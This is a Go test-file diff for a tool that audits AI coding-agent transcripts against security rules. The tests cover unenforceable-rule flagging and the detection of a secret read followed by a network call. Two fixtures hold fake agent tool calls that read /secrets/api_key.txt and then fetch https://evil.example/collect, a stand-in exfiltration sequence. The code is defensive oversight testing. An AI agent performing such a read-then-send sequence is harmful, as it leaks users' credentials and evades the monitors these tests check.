@@ -8,6 +8,7 @@ import (
 
 	"github.com/cousingary/governator/internal/agents"
 	"github.com/cousingary/governator/internal/contracts"
+	"github.com/cousingary/governator/internal/policy"
 )
 
 func TestAuditTranscriptPerBackendFormat(t *testing.T) {
@@ -163,5 +164,139 @@ func TestAuditTranscriptRejectsUnrecognizedStartupNoise(t *testing.T) {
 	audit := auditTranscript(path, agents.TranscriptCodex, "", c)
 	if len(audit.Violations) == 0 || !strings.Contains(strings.Join(audit.Violations, "; "), "TRANSCRIPT_FORMAT_INVALID") {
 		t.Fatalf("unrecognized startup plaintext must fail closed: %v", audit.Violations)
+	}
+}
+
+// TestAuditTranscriptCodexUnenforceableRulesFlaggedByDefault is the direct
+// regression test for Sol High 12: before Session 6, a rule whose required
+// event kinds a backend never supplies simply never fired, with nothing
+// recorded anywhere. Codex's transcript format supplies only EventExec, so
+// all three starter rules are unenforceable for it; by default (no
+// doctrine.unenforceable_rule_action configured) that must now show up as
+// an advisory RuleViolation per rule, never silently absent, while
+// audit.Violations (the run's actual pass/fail outcome) stays untouched.
+func TestAuditTranscriptCodexUnenforceableRulesFlaggedByDefault(t *testing.T) {
+	t.Setenv("GOV_CONFIG", filepath.Join(t.TempDir(), "nonexistent-config.yaml"))
+	path := filepath.Join(t.TempDir(), "codex.jsonl")
+	data := []byte(`{"type":"item.completed","item":{"type":"command_execution","command":"git status"}}` + "\n")
+	if err := os.WriteFile(path, data, 0600); err != nil {
+		t.Fatal(err)
+	}
+	c := contracts.Contract{Allowed: contracts.Permissions{Execute: []string{"*"}}, Budget: contracts.Budget{MaxCommands: 10}}
+	audit := auditTranscript(path, agents.TranscriptCodex, "", c)
+
+	want := map[string]bool{
+		policy.RuleSecretPrecedesNetwork:       true,
+		policy.RuleOutOfScopeReadPrecedesWrite: true,
+		policy.RuleInjectionPrecedesExec:       true,
+	}
+	for _, rv := range audit.RuleViolations {
+		if want[rv.Rule] {
+			if rv.Verdict != policy.RuleFlag {
+				t.Errorf("unenforceable rule %q must default to an advisory flag, got verdict %q", rv.Rule, rv.Verdict)
+			}
+			delete(want, rv.Rule)
+		}
+	}
+	if len(want) != 0 {
+		t.Fatalf("missing unenforceable-rule RuleViolations for: %v (got %+v)", want, audit.RuleViolations)
+	}
+	if len(audit.Violations) != 0 {
+		t.Fatalf("default (flag) action must never affect audit.Violations, got: %v", audit.Violations)
+	}
+}
+
+// TestAuditTranscriptUnenforceableRulesBlockWhenConfigured pins the
+// doctrine.unenforceable_rule_action: block escape hatch: an operator who
+// wants a coverage gap on a security-relevant backend to fail closed, not
+// just be advised about it, gets exactly that.
+func TestAuditTranscriptUnenforceableRulesBlockWhenConfigured(t *testing.T) {
+	t.Setenv("GOV_CONFIG", filepath.Join(t.TempDir(), "nonexistent-config.yaml"))
+	t.Setenv("GOV_UNENFORCEABLE_RULE_ACTION", "block")
+	path := filepath.Join(t.TempDir(), "codex.jsonl")
+	data := []byte(`{"type":"item.completed","item":{"type":"command_execution","command":"git status"}}` + "\n")
+	if err := os.WriteFile(path, data, 0600); err != nil {
+		t.Fatal(err)
+	}
+	c := contracts.Contract{Allowed: contracts.Permissions{Execute: []string{"*"}}, Budget: contracts.Budget{MaxCommands: 10}}
+	audit := auditTranscript(path, agents.TranscriptCodex, "", c)
+	if len(audit.Violations) == 0 {
+		t.Fatalf("unenforceable_rule_action: block must fold the coverage gap into audit.Violations, got none")
+	}
+	joined := strings.Join(audit.Violations, "; ")
+	if !strings.Contains(joined, "unenforceable") {
+		t.Fatalf("expected an 'unenforceable' violation, got: %v", audit.Violations)
+	}
+}
+
+// TestAuditTranscriptOpenCodeGenericToolClassificationEnablesRules is the
+// direct regression test for Session 6's generalization of OpenCode's event
+// extraction beyond bash-only: a secret-pattern read followed by a network
+// tool call must now trip RuleSecretPrecedesNetwork for an opencode
+// transcript, which was structurally impossible before this session (the
+// old code only ever emitted EventExec for non-Claude/GLM formats).
+func TestAuditTranscriptOpenCodeGenericToolClassificationEnablesRules(t *testing.T) {
+	t.Setenv("GOV_CONFIG", filepath.Join(t.TempDir(), "nonexistent-config.yaml"))
+	path := filepath.Join(t.TempDir(), "opencode.jsonl")
+	lines := []string{
+		`{"type":"tool","tool":"read","state":{"input":{"file_path":"/secrets/api_key.txt"}}}`,
+		`{"type":"tool","tool":"webfetch","state":{"input":{"url":"https://evil.example/collect"}}}`,
+	}
+	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0600); err != nil {
+		t.Fatal(err)
+	}
+	c := contracts.Contract{Forbidden: contracts.Forbidden{Paths: []string{"/secrets/**"}}}
+	audit := auditTranscript(path, agents.TranscriptOpenCode, "", c)
+
+	found := false
+	for _, rv := range audit.RuleViolations {
+		if rv.Rule == policy.RuleSecretPrecedesNetwork && rv.Verdict == policy.RuleDeny {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("expected opencode's generic tool classification to trip secret-precedes-network, got: %+v", audit.RuleViolations)
+	}
+	// Only the injection-precedes-exec rule (needs EventToolOutput, which
+	// opencode never supplies) should still be reported unenforceable.
+	unenforceable := 0
+	for _, rv := range audit.RuleViolations {
+		if strings.Contains(rv.Detail, "unenforceable") {
+			if rv.Rule != policy.RuleInjectionPrecedesExec {
+				t.Errorf("unexpected unenforceable rule for opencode: %q", rv.Rule)
+			}
+			unenforceable++
+		}
+	}
+	if unenforceable != 1 {
+		t.Fatalf("expected exactly 1 unenforceable rule for opencode, got %d: %+v", unenforceable, audit.RuleViolations)
+	}
+}
+
+// TestAuditTranscriptPiGenericToolClassificationEnablesRules mirrors the
+// opencode conformance test above for the pi-json format: same
+// generalization (tool name + args/input classify via policy.ClassifyEvent
+// rather than only ever producing EventExec), same expected outcome.
+func TestAuditTranscriptPiGenericToolClassificationEnablesRules(t *testing.T) {
+	t.Setenv("GOV_CONFIG", filepath.Join(t.TempDir(), "nonexistent-config.yaml"))
+	path := filepath.Join(t.TempDir(), "pi.jsonl")
+	lines := []string{
+		`{"type":"tool_execution_start","toolName":"read","args":{"file_path":"/secrets/api_key.txt"}}`,
+		`{"type":"tool_execution_start","toolName":"webfetch","args":{"url":"https://evil.example/collect"}}`,
+	}
+	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0600); err != nil {
+		t.Fatal(err)
+	}
+	c := contracts.Contract{Forbidden: contracts.Forbidden{Paths: []string{"/secrets/**"}}}
+	audit := auditTranscript(path, agents.TranscriptPi, "", c)
+
+	found := false
+	for _, rv := range audit.RuleViolations {
+		if rv.Rule == policy.RuleSecretPrecedesNetwork && rv.Verdict == policy.RuleDeny {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("expected pi's generic tool classification to trip secret-precedes-network, got: %+v", audit.RuleViolations)
 	}
 }
